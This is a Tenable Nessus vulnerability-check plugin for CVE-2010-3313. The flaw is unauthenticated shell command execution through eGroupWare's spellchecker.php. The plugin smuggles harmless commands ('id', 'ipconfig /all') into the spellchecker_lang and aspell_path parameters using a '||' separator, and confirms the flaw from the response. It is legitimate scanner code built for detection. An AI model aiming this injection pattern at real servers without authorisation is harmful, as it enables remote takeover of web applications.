#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(45023);
  script_version("$Revision: 1.12 $");
 script_cvs_date("$Date: 2015/10/13 15:19:32 $");

  script_cve_id("CVE-2010-3313");
  script_bugtraq_id(38609, 38794);
  script_osvdb_id(62805);
  script_xref(name:"Secunia", value:"38859");

  script_name(english:"eGroupWare spellchecker.php Arbitrary Shell Command Execution");
  script_summary(english:"Tries to execute a command");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote web server contains a CGI script that can be abused to
execute arbitrary commands."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The version of eGroupWare hosted on the remote web server fails to
sanitize user-supplied input to the 'aspell_path' and/or
'spellchecker_lang' parameters of the 'spellchecker.php' script before
passing it to a shell.

An unauthenticated, remote attacker can leverage these issues to
execute arbitrary commands subject to the privileges under which the
web server operates.

Note that the install likely has a cross-site scripting vulnerability,
although Nessus has not checked for this."
  );
  script_set_attribute(attribute:"see_also", value:"http://www.cybsec.com/vuln/cybsec_advisory_2010_0303_egroupware_.pdf");
  script_set_attribute(
    attribute:"see_also",
    value:"http://www.egroupware.org/news?category_id=95&item=93"
  );
  script_set_attribute(
    attribute:"solution",
    value:
"Upgrade to eGroupWare 1.6.003 / eGroupWare version EPL 9.1.20100309 /
9.2.20100309 or later."
  );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2010/03/09");
  script_set_attribute(attribute:"patch_publication_date", value:"2010/03/09");
  script_set_attribute(attribute:"plugin_publication_date", value:"2010/03/10");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:egroupware:egroupware");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2010-2015 Tenable Network Security, Inc.");

  script_dependencies("egroupware_detect.nasl", "os_fingerprint.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/egroupware");

  exit(0);
}


include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");
include("webapp_func.inc");


port = get_http_port(default:80, php:TRUE);


# Test an install.
install = get_install_from_kb(appname:'egroupware', port:port);
if (isnull(install)) exit(1, "eGroupWare wasn't detected on port "+port+".");
dir = install['dir'];

# nb: if you want to see multiline output under *nix, filter output and
#     change newlines into carriage returns (eg, append '|tr "\n" "\r"'
#     to the command) and the plugin will take care of that.
os = get_kb_item("Host/OS");
if (os)
{
  if ("Windows" >< os) cmd = "ipconfig /all";
  else cmd = "id";
  cmds = make_list(cmd);
}
else cmds = make_list("id", "ipconfig /all");
cmd_pats = make_array();
cmd_pats["id"] = "uid=[0-9]+.*gid=[0-9]+.*";
cmd_pats["ipconfig /all"] = "Subnet Mask";

foreach cmd (cmds)
{
  exploit = SCRIPT_NAME + '||' + cmd + ' ||';
  url = dir + '/phpgwapi/js/fckeditor/editor/dialog/fck_spellerpages/spellerpages/server-scripts/spellchecker.php?' +
    'spellchecker_lang=' + urlencode(str:exploit);

  res = http_send_recv3(port:port, method:"GET", item:url, exit_on_fail:TRUE);

  # If the exploit didn't work and the "Perform thorough tests" setting is enabled, check for the other vuln.
  if (
    (!res[2] || !egrep(pattern:cmd_pats[cmd], string:res[2])) &&
    thorough_tests
  )
  {
    url = dir + '/phpgwapi/js/fckeditor/editor/dialog/fck_spellerpages/spellerpages/server-scripts/spellchecker.php?' +
      'aspell_path=' + urlencode(str:exploit);

    res = http_send_recv3(port:port, method:"GET", item:url, exit_on_fail:TRUE);
  }

  error = NULL;
  if (res[2] && "error = '" >< res[2])
  {
    foreach line (split(res[2], keep:FALSE))
      if (line =~ "^error = '")
      {
        error = line - "error = '";
        error = substr(error, 0, strlen(error)-2);
        break;
      }
  }
  if (isnull(error)) continue;

  # There's a problem if we see the expected command output.
  pat = cmd_pats[cmd];

  if (
    '-a --lang='+exploit >< error ||
    'Aspell program execution failed (`'+exploit >< error ||
    egrep(pattern:pat, string:error)
  )
  {
    output = strstr(error, "`\\n") - "`\\n";
    output = substr(output, 0, strlen(output)-2);
    output = str_replace(find:'\r', replace:'\n', string:output);

    if (egrep(pattern:pat, string:output))
    {
      if (report_verbosity > 0)
      {
        header =
          "Nessus was able to execute the command '" + cmd + "' on the" + '\n' +
          'remote host using the following URL';
        trailer = '';

        if (report_verbosity > 1)
        {
          trailer =
            'This produced the following output :\n' +
            '\n' +
            crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n' +
            output + '\n' +
            crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n';
        }
        report = get_vuln_report(items:url, port:port, header:header, trailer:trailer);
        security_hole(port:port, extra:report);
      }
      else security_hole(port);
    }
    else
    {
      if (report_verbosity > 0)
      {
        header =
          "Nessus tried to execute the command '" + cmd + "' on the" + '\n' +
          'remote host using the following URL';
        trailer =
          'While it did not receive the expected output, the install appears\n' +
          'vulnerable to attack based on the following error message generated\n' +
          'by the application :\n' +
          '\n' +
          "  " + error + '\n';
        report = get_vuln_report(items:url, port:port, header:header, trailer:trailer);
        security_hole(port:port, extra:report);
      }
      else security_hole(port);
    }
    exit(0);
  }
}
exit(0, "The eGroupWare install at "+build_url(port:port, qs:dir+"/")+" is not affected.");
